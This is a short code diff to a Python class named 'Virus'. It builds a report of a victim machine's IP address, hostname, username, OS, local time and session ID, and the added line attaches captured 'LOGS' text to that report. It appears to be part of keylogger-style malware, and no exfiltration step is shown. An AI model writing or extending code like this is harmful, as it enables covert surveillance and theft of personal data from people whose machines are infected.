@@ -72,3 +72,4 @@ class Virus(object):
                     continue
             
             loginfo = f"IP: {ip_address}\nHostname: {socket.gethostname()}\nUser: {os.environ.get('username')}\nOS Name: {os.name}\nLocal Time: {datetime.now()}\nSession ID: {self.SESSION_ID}\n\n"
+            logtext = f"{loginfo}LOGS:\n{textstr}"
